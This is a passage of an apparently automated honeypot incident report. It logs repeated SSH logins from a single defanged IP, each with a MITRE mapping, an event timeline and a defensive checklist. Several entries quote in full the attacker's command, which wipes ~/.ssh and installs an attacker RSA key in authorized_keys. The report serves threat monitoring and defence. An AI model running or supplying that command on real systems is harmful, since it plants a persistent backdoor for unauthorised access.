| `2026-05-04 11:22:38` | `cowrie.command.failed` |
| `2026-05-04 11:22:38` | `cowrie.log.closed` |
| `2026-05-04 11:22:38` | `cowrie.session.params` |
| `2026-05-04 11:22:38` | `cowrie.command.input` |
| `2026-05-04 11:22:38` | `cowrie.session.file_download` |
| `2026-05-04 11:22:38` | `cowrie.log.closed` |
| `2026-05-04 11:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56ced9178828

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:22 |
| **Last Seen** | 2026-05-04 11:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:22:40` | `cowrie.session.connect` |
| `2026-05-04 11:22:40` | `cowrie.client.version` |
| `2026-05-04 11:22:40` | `cowrie.client.kex` |
| `2026-05-04 11:22:41` | `cowrie.login.success` |
| `2026-05-04 11:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29db51b829c2

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:23 |
| **Last Seen** | 2026-05-04 11:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:23:46` | `cowrie.session.connect` |
| `2026-05-04 11:23:46` | `cowrie.client.version` |
| `2026-05-04 11:23:47` | `cowrie.client.kex` |
| `2026-05-04 11:23:47` | `cowrie.login.success` |
| `2026-05-04 11:23:47` | `cowrie.session.params` |
| `2026-05-04 11:23:47` | `cowrie.command.input` |
| `2026-05-04 11:23:47` | `cowrie.command.failed` |
| `2026-05-04 11:23:47` | `cowrie.log.closed` |
| `2026-05-04 11:23:48` | `cowrie.session.params` |
| `2026-05-04 11:23:48` | `cowrie.command.input` |
| `2026-05-04 11:23:48` | `cowrie.session.file_download` |
| `2026-05-04 11:23:48` | `cowrie.log.closed` |
| `2026-05-04 11:23:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e52601d686d3

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:23 |
| **Last Seen** | 2026-05-04 11:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:23:50` | `cowrie.session.connect` |
| `2026-05-04 11:23:50` | `cowrie.client.version` |
| `2026-05-04 11:23:50` | `cowrie.client.kex` |
| `2026-05-04 11:23:50` | `cowrie.login.success` |
| `2026-05-04 11:23:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-471e1dc82e3e

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:24 |
| **Last Seen** | 2026-05-04 11:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:24:57` | `cowrie.session.connect` |
| `2026-05-04 11:24:57` | `cowrie.client.version` |
| `2026-05-04 11:24:57` | `cowrie.client.kex` |
| `2026-05-04 11:24:58` | `cowrie.login.success` |
| `2026-05-04 11:24:58` | `cowrie.session.params` |
| `2026-05-04 11:24:58` | `cowrie.command.input` |
| `2026-05-04 11:24:58` | `cowrie.command.failed` |
| `2026-05-04 11:24:58` | `cowrie.log.closed` |
| `2026-05-04 11:24:58` | `cowrie.session.params` |
| `2026-05-04 11:24:58` | `cowrie.command.input` |
| `2026-05-04 11:24:58` | `cowrie.session.file_download` |
| `2026-05-04 11:24:58` | `cowrie.log.closed` |
| `2026-05-04 11:25:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82862819ac4f

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:25 |
| **Last Seen** | 2026-05-04 11:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:25:00` | `cowrie.session.connect` |
| `2026-05-04 11:25:00` | `cowrie.client.version` |
| `2026-05-04 11:25:00` | `cowrie.client.kex` |
| `2026-05-04 11:25:01` | `cowrie.login.success` |
| `2026-05-04 11:25:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfb40e4e8969

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:27 |
| **Last Seen** | 2026-05-04 11:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:27:26` | `cowrie.session.connect` |
| `2026-05-04 11:27:26` | `cowrie.client.version` |
| `2026-05-04 11:27:26` | `cowrie.client.kex` |
| `2026-05-04 11:27:26` | `cowrie.login.success` |
| `2026-05-04 11:27:26` | `cowrie.session.params` |
| `2026-05-04 11:27:26` | `cowrie.command.input` |
| `2026-05-04 11:27:26` | `cowrie.command.failed` |
| `2026-05-04 11:27:27` | `cowrie.log.closed` |
| `2026-05-04 11:27:27` | `cowrie.session.params` |
| `2026-05-04 11:27:27` | `cowrie.command.input` |
| `2026-05-04 11:27:27` | `cowrie.session.file_download` |
| `2026-05-04 11:27:27` | `cowrie.log.closed` |
| `2026-05-04 11:27:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0ac2a58b67f

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:27 |
| **Last Seen** | 2026-05-04 11:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:27:29` | `cowrie.session.connect` |
| `2026-05-04 11:27:29` | `cowrie.client.version` |
| `2026-05-04 11:27:29` | `cowrie.client.kex` |
| `2026-05-04 11:27:29` | `cowrie.login.success` |
| `2026-05-04 11:27:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbe3b38c171a

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:28 |
| **Last Seen** | 2026-05-04 11:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:28:39` | `cowrie.session.connect` |
| `2026-05-04 11:28:39` | `cowrie.client.version` |
| `2026-05-04 11:28:39` | `cowrie.client.kex` |
| `2026-05-04 11:28:39` | `cowrie.login.success` |
| `2026-05-04 11:28:39` | `cowrie.session.params` |
| `2026-05-04 11:28:39` | `cowrie.command.input` |
| `2026-05-04 11:28:39` | `cowrie.command.failed` |
| `2026-05-04 11:28:40` | `cowrie.log.closed` |
| `2026-05-04 11:28:40` | `cowrie.session.params` |
| `2026-05-04 11:28:40` | `cowrie.command.input` |
| `2026-05-04 11:28:40` | `cowrie.session.file_download` |
| `2026-05-04 11:28:40` | `cowrie.log.closed` |
| `2026-05-04 11:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-600fc1f95f9a

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:28 |
| **Last Seen** | 2026-05-04 11:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:28:42` | `cowrie.session.connect` |
| `2026-05-04 11:28:42` | `cowrie.client.version` |
| `2026-05-04 11:28:42` | `cowrie.client.kex` |
| `2026-05-04 11:28:42` | `cowrie.login.success` |
| `2026-05-04 11:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca6396b009da

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:31 |
| **Last Seen** | 2026-05-04 11:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:31:04` | `cowrie.session.connect` |
| `2026-05-04 11:31:04` | `cowrie.client.version` |
| `2026-05-04 11:31:04` | `cowrie.client.kex` |
| `2026-05-04 11:31:05` | `cowrie.login.success` |
| `2026-05-04 11:31:05` | `cowrie.session.params` |
| `2026-05-04 11:31:05` | `cowrie.command.input` |
| `2026-05-04 11:31:05` | `cowrie.command.failed` |
| `2026-05-04 11:31:05` | `cowrie.log.closed` |
| `2026-05-04 11:31:05` | `cowrie.session.params` |
| `2026-05-04 11:31:05` | `cowrie.command.input` |
| `2026-05-04 11:31:05` | `cowrie.session.file_download` |
| `2026-05-04 11:31:05` | `cowrie.log.closed` |
| `2026-05-04 11:31:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23e7a9c5acf5

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:31 |
| **Last Seen** | 2026-05-04 11:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:31:07` | `cowrie.session.connect` |
| `2026-05-04 11:31:07` | `cowrie.client.version` |
| `2026-05-04 11:31:07` | `cowrie.client.kex` |
| `2026-05-04 11:31:08` | `cowrie.login.success` |
| `2026-05-04 11:31:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aeb88ed13d93

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:32 |
| **Last Seen** | 2026-05-04 11:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:32:20` | `cowrie.session.connect` |
| `2026-05-04 11:32:20` | `cowrie.client.version` |
| `2026-05-04 11:32:20` | `cowrie.client.kex` |
| `2026-05-04 11:32:21` | `cowrie.login.success` |
| `2026-05-04 11:32:21` | `cowrie.session.params` |
| `2026-05-04 11:32:21` | `cowrie.command.input` |
| `2026-05-04 11:32:21` | `cowrie.command.failed` |
| `2026-05-04 11:32:21` | `cowrie.log.closed` |
| `2026-05-04 11:32:22` | `cowrie.session.params` |
| `2026-05-04 11:32:22` | `cowrie.command.input` |
| `2026-05-04 11:32:22` | `cowrie.session.file_download` |
| `2026-05-04 11:32:22` | `cowrie.log.closed` |
| `2026-05-04 11:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf2e3a6fff94

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:32 |
| **Last Seen** | 2026-05-04 11:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:32:24` | `cowrie.session.connect` |
| `2026-05-04 11:32:24` | `cowrie.client.version` |
| `2026-05-04 11:32:24` | `cowrie.client.kex` |
| `2026-05-04 11:32:25` | `cowrie.login.success` |
| `2026-05-04 11:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6d6eeaf24ea

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:33 |
| **Last Seen** | 2026-05-04 11:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:33:40` | `cowrie.session.connect` |
| `2026-05-04 11:33:40` | `cowrie.client.version` |
| `2026-05-04 11:33:40` | `cowrie.client.kex` |
| `2026-05-04 11:33:41` | `cowrie.login.success` |
| `2026-05-04 11:33:41` | `cowrie.session.params` |
| `2026-05-04 11:33:41` | `cowrie.command.input` |
| `2026-05-04 11:33:41` | `cowrie.command.failed` |
| `2026-05-04 11:33:42` | `cowrie.log.closed` |
| `2026-05-04 11:33:42` | `cowrie.session.params` |
| `2026-05-04 11:33:42` | `cowrie.command.input` |
| `2026-05-04 11:33:42` | `cowrie.session.file_download` |
| `2026-05-04 11:33:42` | `cowrie.log.closed` |
| `2026-05-04 11:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aadc01e90d5c

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:33 |
| **Last Seen** | 2026-05-04 11:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:33:45` | `cowrie.session.connect` |
| `2026-05-04 11:33:45` | `cowrie.client.version` |
| `2026-05-04 11:33:45` | `cowrie.client.kex` |
| `2026-05-04 11:33:45` | `cowrie.login.success` |
| `2026-05-04 11:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e31fa669596

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:37 |
| **Last Seen** | 2026-05-04 11:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:37:15` | `cowrie.session.connect` |
| `2026-05-04 11:37:15` | `cowrie.client.version` |
| `2026-05-04 11:37:15` | `cowrie.client.kex` |
| `2026-05-04 11:37:15` | `cowrie.login.success` |
| `2026-05-04 11:37:16` | `cowrie.session.params` |
| `2026-05-04 11:37:16` | `cowrie.command.input` |
| `2026-05-04 11:37:16` | `cowrie.command.failed` |
| `2026-05-04 11:37:16` | `cowrie.log.closed` |
| `2026-05-04 11:37:16` | `cowrie.session.params` |
| `2026-05-04 11:37:16` | `cowrie.command.input` |
| `2026-05-04 11:37:16` | `cowrie.session.file_download` |
| `2026-05-04 11:37:16` | `cowrie.log.closed` |
| `2026-05-04 11:37:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a58531430305

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:37 |
| **Last Seen** | 2026-05-04 11:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:37:18` | `cowrie.session.connect` |
| `2026-05-04 11:37:18` | `cowrie.client.version` |
| `2026-05-04 11:37:18` | `cowrie.client.kex` |
| `2026-05-04 11:37:18` | `cowrie.login.success` |
| `2026-05-04 11:37:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7a13466e275

